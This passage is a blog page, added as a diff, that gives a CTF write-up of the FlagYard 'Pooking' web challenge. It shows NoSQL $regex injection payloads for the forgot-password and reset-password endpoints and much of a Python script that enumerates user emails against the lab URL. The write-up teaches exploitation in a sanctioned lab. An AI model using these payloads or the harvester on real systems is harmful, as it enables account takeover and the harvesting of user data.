@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Pooking [WEB] (Medium) - FlagYard | m7eesn blog</title>
+<meta name="title" content="Pooking [WEB] (Medium) - FlagYard" />
+<meta name="description" content="1. Challenge Overview
+Challenge Description
+
+Explore the cars world with Pooking.com
+
+Pooking is a web challenge from flagYard, it&rsquo;s about car rental portal The front page is harmless, but the API that powers it exposes several JSON endpoints:
+
+POST /api/forgot-password
+POST /api/reset-password
+POST /api/login
+POST /api/book-car
+
+The challenge is to obtain customer accounts (and ultimately the flag) without knowing any credentials up front. During recon we noticed that every request body we send is forwarded directly into MongoDB. That gives us the classic NoSQL-injection playground: if we embed operators such as $regex, the server evaluates them instead of treating them as plain strings." />
+<meta name="keywords" content="" />
+
+
+<meta property="og:url" content="https://blog.looter.dev/blog/2025-10-23-flagyard-pooking-web-challenge/">
+  <meta property="og:site_name" content="m7eesn blog">
+  <meta property="og:title" content="Pooking [WEB] (Medium) - FlagYard">
+  <meta property="og:description" content="1. Challenge Overview Challenge Description Explore the cars world with Pooking.com
+Pooking is a web challenge from flagYard, it’s about car rental portal The front page is harmless, but the API that powers it exposes several JSON endpoints:
+POST /api/forgot-password POST /api/reset-password POST /api/login POST /api/book-car The challenge is to obtain customer accounts (and ultimately the flag) without knowing any credentials up front. During recon we noticed that every request body we send is forwarded directly into MongoDB. That gives us the classic NoSQL-injection playground: if we embed operators such as $regex, the server evaluates them instead of treating them as plain strings.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-10-23T17:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-23T17:00:00+00:00">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pooking [WEB] (Medium) - FlagYard">
+  <meta name="twitter:description" content="1. Challenge Overview Challenge Description Explore the cars world with Pooking.com
+Pooking is a web challenge from flagYard, it’s about car rental portal The front page is harmless, but the API that powers it exposes several JSON endpoints:
+POST /api/forgot-password POST /api/reset-password POST /api/login POST /api/book-car The challenge is to obtain customer accounts (and ultimately the flag) without knowing any credentials up front. During recon we noticed that every request body we send is forwarded directly into MongoDB. That gives us the classic NoSQL-injection playground: if we embed operators such as $regex, the server evaluates them instead of treating them as plain strings.">
+
+
+
+
+  <meta itemprop="name" content="Pooking [WEB] (Medium) - FlagYard">
+  <meta itemprop="description" content="1. Challenge Overview Challenge Description Explore the cars world with Pooking.com
+Pooking is a web challenge from flagYard, it’s about car rental portal The front page is harmless, but the API that powers it exposes several JSON endpoints:
+POST /api/forgot-password POST /api/reset-password POST /api/login POST /api/book-car The challenge is to obtain customer accounts (and ultimately the flag) without knowing any credentials up front. During recon we noticed that every request body we send is forwarded directly into MongoDB. That gives us the classic NoSQL-injection playground: if we embed operators such as $regex, the server evaluates them instead of treating them as plain strings.">
+  <meta itemprop="datePublished" content="2025-10-23T17:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-10-23T17:00:00+00:00">
+  <meta itemprop="wordCount" content="2013">
+  <meta itemprop="keywords" content="Ctf,Writeup,Flagyard">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  code {
+    padding: 4px 8px !important;
+    margin: 0 4px !important;
+    background-color: rgba(0, 0, 0, 0.05);
+  }
+
+   
+  div.highlight {
+    background-color: rgba(15, 1, 1, 0.801);
+    border-radius: 3px;
+  }
+
+  div.highlight pre {
+    padding: 1em !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  div.highlight code {
+    padding: 0 !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    code {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    div.highlight {
+      background-color: rgba(0, 0, 0, 0.3);
+    }
+  }
+</style></head>
+
+<body>
+  <header><a href="https://blog.looter.dev/" class="title">
+  <h2>m7eesn blog</h2>
+</a>
+<nav>
+</nav>
+</header>
+  <main>
+
+<h1>Pooking [WEB] (Medium) - FlagYard</h1>
+<p>
+  <i>
+    <time datetime='2025-10-23'>
+      23 Oct, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <h2 id="1-challenge-overview">1. Challenge Overview</h2>
+<h3 id="challenge-description">Challenge Description</h3>
+<blockquote>
+<p><em>Explore the cars world with Pooking.com</em></p>
+</blockquote>
+<p>Pooking is a web challenge from flagYard, it&rsquo;s about car rental portal The front page is harmless, but the API that powers it exposes several JSON endpoints:</p>
+<ul>
+<li><code>POST /api/forgot-password</code></li>
+<li><code>POST /api/reset-password</code></li>
+<li><code>POST /api/login</code></li>
+<li><code>POST /api/book-car</code></li>
+</ul>
+<p>The challenge is to obtain customer accounts (and ultimately the flag) without knowing any credentials up front. During recon we noticed that every request body we send is forwarded directly into MongoDB. That gives us the classic NoSQL-injection playground: if we embed operators such as <code>$regex</code>, the server evaluates them instead of treating them as plain strings.</p>
+<hr>
+<h2 id="2-reconnaissance-notes">2. Reconnaissance Notes</h2>
+<ol>
+<li>
+<p><strong>Forgot Password accepts regex.</strong><br>
+Sending <code>{&quot;email&quot;:{&quot;$regex&quot;:&quot;^a&quot;}}</code> returns HTTP 200 whenever a stored email starts with “a”. The server clearly runs <code>db.users.findOne(req.body.email)</code> without sanitizing the payload.</p>
+</li>
+<li>
+<p><strong>Reset Password validates tokens with user input.</strong><br>
+We tested <code>{&quot;token&quot;:{&quot;$regex&quot;:&quot;^.*&quot;},&quot;newPassword&quot;:&quot;password&quot;}</code> and the backend happily accepted it, proving it evaluates the regex operator and therefore matches any token document.</p>
+</li>
+<li>
+<p><strong>Book-Car is a dead end for leakage.</strong><br>
+We tried replacing strings with <code>$regex</code> there as well. The API simply echoed our JSON in the response, which told us it was performing an insert rather than a read. No data exfiltration through that route.</p>
+</li>
+</ol>
+<p>With those observations we had a route to victory: enumerate every email via <code>forgot-password</code>, then brute-force the reset endpoint until each account’s password was replaced with a value we control.</p>
+<hr>
+<h2 id="3-building-the-email-enumerator-mail_extractorpy">3. Building the Email Enumerator (<code>mail_extractor.py</code>)</h2>
+<p>Manual probing with curl is miserable, so we wrote an automated harvester.</p>
+<p>Key ideas inside <code>mail_extractor.py</code>:</p>
+<ul>
+<li>
+<p><strong>Depth-first prefix search.</strong><br>
+Starting from an empty prefix we append characters from a charset (<code>a-z0-9@_-.'</code>). For each candidate we POST <code>{&quot;email&quot;:{&quot;$regex&quot;:&quot;^&lt;candidate&gt;.*&quot;,&quot;$options&quot;:&quot;i&quot;}}</code>. A 200 response means at least one email begins with that prefix, so we recurse deeper.</p>
+</li>
+<li>
+<p><strong>Domain-aware guessing.</strong><br>
+Enumerating the domain part character-by-character is slow. As soon as we hit <code>local@</code>, we compare the partially discovered domain against a list of common providers (<code>gmail.com</code>, <code>outlook.com</code>, etc.) plus any domains we already found. If <code>user.name@</code> matches <code>mail.com</code>, we immediately try the whole string using an exact regex (<code>^user.name@mail.com$</code>). That cuts hundreds of requests per account.</p>
+</li>
+<li>
+<p><strong>Pruning confirmed branches.</strong><br>
+Once an address is verified we add it to <code>emails_found.txt</code> and prevent the DFS from continuing on that branch. Without this guard the script would happily try <code>@gmailx</code>, <code>@gmaily</code>, … even though the real domain was already recorded.</p>
+</li>
+</ul>
+<p>Result: We harvested 34 valid emails.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> Iterable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your_url.playat.flagyard.com/api/forgot-password&#34;</span>
+</span></span><span style="display:flex;"><span>HEADERS: dict[str, str] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://your_url.playat.flagyard.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>REGEX_OPTIONS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;i&#34;</span> <span style="color:#75715e"># case-insensitive matching</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHARSET: list[str] <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span>  string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@_-.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAX_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>SAVE_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emails_found.txt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(SAVE_FILE):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(SAVE_FILE, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>EXTRA_EMAILS_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emails.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DEFAULT_DOMAINS: set[str] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;gmail.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;outlook.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;hotmail.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;live.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;yahoo.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;icloud.com&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">probe_regex</span>(regex):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;email&#34;</span>: {<span style="color:#e6db74">&#34;$regex&#34;</span>: regex}}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> REGEX_OPTIONS:
+</span></span><span style="display:flex;"><span>            payload[<span style="color:#e6db74">&#34;email&#34;</span>][<span style="color:#e6db74">&#34;$options&#34;</span>] <span style="color:#f92672">=</span> REGEX_OPTIONS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>HEADERS, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>, r
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, r
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;request error:&#34;</span>, e)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_known_paths</span>(emails: set[str]) <span style="color:#f92672">-&gt;</span> dict[str, set[str]]:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Map each prefix (lowercased) to the next character(s) observed in known emails.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    mapping: dict[str, set[str]] <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> email <span style="color:#f92672">in</span> emails:
+</span></span><span style="display:flex;"><span>        lowered: str <span style="color:#f92672">=</span> email<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(lowered)):
+</span></span><span style="display:flex;"><span>            prefix: str <span style="color:#f92672">=</span> lowered[:i]
+</span></span><span style="display:flex;"><span>            next_char: str <span style="color:#f92672">=</span> lowered[i]
+</span></span><span style="display:flex;"><span>            mapping<span style="color:#f92672">.</span>setdefault(prefix, set())<span style="color:#f92672">.</span>add(next_char)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> mapping
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_domains</span>(emails: Iterable[str]) <span style="color:#f92672">-&gt;</span> set[str]:
+</span></span><span style="display:flex;"><span>    domains: set[str] <span style="color:#f92672">=</span> set()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> email <span style="color:#f92672">in</span> emails:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> email:
+</span></span><span style="display:flex;"><span>            domains<span style="color:#f92672">.</span>add(email<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>lower())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> domains
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_domain_candidates</span>(found_emails: set[str], extra_paths: list[str] <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span> ) <span style="color:#f92672">-&gt;</span> set[str]:
+</span></span><span style="display:flex;"><span>    domains <span style="color:#f92672">=</span> set(DEFAULT_DOMAINS)
+</span></span><span style="display:flex;"><span>    domains<span style="color:#f92672">.</span>update(extract_domains(found_emails))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> path <span style="color:#f92672">in</span> extra_paths <span style="color:#f92672">or</span> []:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> path <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(path):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
+</span></span><span style="display:flex;"><span>                    line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> line:
+</span></span><span style="display:flex;"><span>                        domains<span style="color:#f92672">.</span>add(line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>lower())
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;warning: unable to read </span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> domains
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_domain_guesses</span>(
+</span></span><span style="display:flex;"><span>    local_part: str,
+</span></span><span style="display:flex;"><span>    domain_prefix: str,
+</span></span><span style="display:flex;"><span>    known_domains: set[str],
+</span></span><span style="display:flex;"><span>    found: set[str],
+</span></span><span style="display:flex;"><span>    found_lower: set[str],
+</span></span><span style="display:flex;"><span>    tested_exact: set[str],
+</span></span><span style="display:flex;"><span>    domain_guess_attempted: set[str],
+</span></span><span style="display:flex;"><span>    known_paths: dict[str, set[str]],
+</span></span><span style="display:flex;"><span>    prune_prefixes: set[str],
+</span></span><span style="display:flex;"><span>    verified_domains_by_local: dict[str, set[str]],
+</span></span><span style="display:flex;"><span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Attempt full domain combinations based on known domains.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    domain_prefix_lower <span style="color:#f92672">=</span> domain_prefix<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> domain <span style="color:#f92672">in</span> sorted(known_domains):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> domain<span style="color:#f92672">.</span>startswith(domain_prefix_lower):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        guess <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>local_part<span style="color:#e6db74">}</span><span style="color:#e6db74">@</span><span style="color:#e6db74">{</span>domain<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        guess_lower <span style="color:#f92672">=</span> guess<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> guess_lower <span style="color:#f92672">in</span> found_lower <span style="color:#f92672">or</span> guess_lower <span style="color:#f92672">in</span> domain_guess_attempted:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        domain_guess_attempted<span style="color:#f92672">.</span>add(guess_lower)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> verify_exact(guess):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; VERIFIED (domain guess): </span><span style="color:#e6db74">{</span>guess<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            found<span style="color:#f92672">.</span>add(guess)
+</span></span><span style="display:flex;"><span>            found_lower<span style="color:#f92672">.</span>add(guess_lower)
+</span></span><span style="display:flex;"><span>            known_domains<span style="color:#f92672">.</span>add(domain)
+</span></span><span style="display:flex;"><span>            prune_prefixes<span style="color:#f92672">.</span>add(guess_lower)
+</span></span><span style="display:flex;"><span>            verified_domains_by_local<span style="color:#f92672">.</span>setdefault(local_part<span style="color:#f92672">.</span>lower(), set())<span style="color:#f92672">.</span>add(domain)
+</span></span><span style="display:flex;"><span>            persist_found(sorted(found, key<span style="color:#f92672">=</span>str<span style="color:#f92672">.</span>lower), SAVE_FILE)
+</span></span><span style="display:flex;"><span>            known_paths<span style="color:#f92672">.</span>clear()
+</span></span><span style="display:flex;"><span>            known_paths<span style="color:#f92672">.</span>update(build_known_paths(found))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            tested_exact<span style="color:#f92672">.</span>add(guess_lower)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_char_order</span>(prefix: str, known_paths: dict[str, set[str]]) <span style="color:#f92672">-&gt;</span> list[str]:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Order characters so known-path continuations are attempted last.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    preferred <span style="color:#f92672">=</span> known_paths<span style="color:#f92672">.</span>get(prefix<span style="color:#f92672">.</span>lower(), set())
+</span></span><span style="display:flex;"><span>    primary: list[str] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    postponed: list[str] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> CHARSET:
+</span></span><span style="display:flex;"><span>        (postponed <span style="color:#66d9ef">if</span> ch<span style="color:#f92672">.</span>lower() <span style="color:#f92672">in</span> preferred <span style="color:#66d9ef">else</span> primary)<span style="color:#f92672">.</span>append(ch)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> primary <span style="color:#f92672">+</span> postponed
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enumerate_prefixes</span>(
+</span></span><span style="display:flex;"><span>    start_prefix: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>    known_paths: dict[str, set[str]] <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>    prune_prefixes: set[str] <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>    verified_domains_by_local: dict[str, set[str]] <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Depth-first enumerate all prefixes that produce regex hits.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> known_paths <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        known_paths <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> prune_prefixes <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        prune_prefixes <span style="color:#f92672">=</span> set()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> verified_domains_by_local <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        verified_domains_by_local <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    attempt_counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># stack entries: (prefix, next_index, tried_normalized_chars, char_order)</span>
+</span></span><span style="display:flex;"><span>    stack: list[tuple[str, int, set[str], list[str]]] <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        (start_prefix, <span style="color:#ae81ff">0</span>, set(), build_char_order(start_prefix, known_paths))
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> stack:
+</span></span><span style="display:flex;"><span>        prefix, idx, tried_norm, char_order <span style="color:#f92672">=</span> stack[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        prefix_lower <span style="color:#f92672">=</span> prefix<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If this prefix or any of its extensions are already fully resolved, skip.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> any(prefix_lower<span style="color:#f92672">.</span>startswith(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> prune_prefixes):
+</span></span><span style="display:flex;"><span>            stack<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> prefix:
+</span></span><span style="display:flex;"><span>            local_part, domain_part <span style="color:#f92672">=</span> prefix_lower<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            domains <span style="color:#f92672">=</span> verified_domains_by_local<span style="color:#f92672">.</span>get(local_part)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> domains:
+</span></span><span style="display:flex;"><span>                should_pop <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> domain <span style="color:#f92672">in</span> domains:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> domain<span style="color:#f92672">.</span>startswith(domain_part):
